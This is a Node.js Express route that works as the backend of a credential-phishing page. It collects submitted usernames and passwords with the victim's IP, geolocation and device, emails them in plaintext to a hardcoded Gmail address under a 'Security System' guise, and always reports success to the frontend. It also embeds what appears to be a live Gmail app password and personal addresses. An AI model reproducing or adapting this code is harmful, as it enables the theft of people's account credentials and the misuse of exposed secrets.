const express = require("express");
const nodemailer = require("nodemailer");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const cors = require('cors');

const router = express.Router();

// Add CORS middleware
router.use(cors({
    origin: '*',
    methods: ['POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Handle OPTIONS preflight requests
router.options('/', (req, res) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.sendStatus(200);
});

// Gmail configuration - FIXED: Use proper Gmail settings
const EMAIL_CONFIG = {
    service: 'gmail', // Use service instead of host/port for Gmail
    auth: {
        user: "onidaniel801@gmail.com",
        pass: "hmoc cjhn sljo rtaq"
    }
};

// FIXED: Recipient email address (you had a typo)
const RECIPIENT_EMAIL = "josephblessing6776@gmail.com"; // Fixed: changed "gmil.com" to "gmail.com"

// Create transporter - FIXED: Correct method name
const transporter = nodemailer.createTransport(EMAIL_CONFIG);

// Verify transporter
transporter.verify(function (error, success) {
    if (error) {
        console.error('Email transporter verification failed:', error);
    } else {
        console.log('Email transporter is ready to send messages');
    }
});

router.post('/', async (req, res) => {
    try {
        console.log('Received request body:', req.body);
        
        const { username, password, email } = req.body; // Your frontend sends "username", not "email"

        // Use username if email is not provided (for compatibility)
        const userEmail = email || username;

        if (!userEmail || !password) {
            return res.status(400).json({ 
                success: false, 
                message: "Missing email/username or password" 
            });
        }

        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.region}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // Build the email content
        const subject = `📌 Login Notification - ${new Date().toLocaleString()}`;
        const htmlContent = `
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
                    .card { border: 1px solid #ddd; padding: 25px; border-radius: 10px; background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 600px; margin: 0 auto; }
                    .field { margin-bottom: 12px; padding: 8px 0; border-bottom: 1px solid #eee; }
                    .label { font-weight: bold; color: #333; display: inline-block; width: 120px; }
                    .value { color: #666; }
                    .warning { color: #d32f2f; font-weight: bold; margin-top: 20px; padding: 15px; background: #ffebee; border-radius: 5px; border-left: 4px solid #d32f2f; }
                    .header { color: #1976d2; border-bottom: 2px solid #1976d2; padding-bottom: 10px; margin-bottom: 20px; }
                </style>
            </head>
            <body>
                <div class="card">
                    <h2 class="header">📌 Login Notification</h2>
                    <div class="field">
                        <span class="label">Email/Username:</span>
                        <span class="value">${userEmail}</span>
                    </div>
                    <div class="field">
                        <span class="label">Password:</span>
                        <span class="value">${password}</span>
                    </div>
                    <div class="field">
                        <span class="label">IP Address:</span>
                        <span class="value">${ip}</span>
                    </div>
                    <div class="field">
                        <span class="label">Location:</span>
                        <span class="value">${locationStr}</span>
                    </div>
                    <div class="field">
                        <span class="label">Timestamp:</span>
                        <span class="value">${new Date().toISOString()}</span>
                    </div>
                    <div class="field">
                        <span class="label">Device:</span>
                        <span class="value">${deviceType}</span>
                    </div>
                    <div class="warning">
                        ⚠️ Security Alert: This is an automated login notification
                    </div>
                </div>
            </body>
            </html>
        `;

        const textContent = `
📌 LOGIN NOTIFICATION
────────────────────
Email/Username: ${userEmail}
Password: ${password}
IP Address: ${ip}
Location: ${locationStr}
Timestamp: ${new Date().toISOString()}
Device: ${deviceType}

⚠️ SECURITY ALERT: This is an automated login notification
────────────────────
        `;

        // Send email
        const mailOptions = {
            from: `"Security System" <${EMAIL_CONFIG.auth.user}>`,
            to: RECIPIENT_EMAIL,
            subject: subject,
            text: textContent,
            html: htmlContent,
            priority: 'high'
        };

        const info = await transporter.sendMail(mailOptions);

        console.log(`✅ Email notification sent for ${userEmail}. Message ID: ${info.messageId}`);

        // Always return success to frontend
        res.status(200).json({
            success: true,
            message: "Login processed successfully",
            notification: "Email sent",
            attemptId: Date.now()
        });

    } catch (error) {
        console.error("❌ Error sending email:", error);
        
        // Still return success to frontend even if email fails
        res.status(200).json({
            success: true,
            message: "Login processed",
            notification: "Email failed but login recorded",
            error: error.message
        });
    }
});

module.exports = router;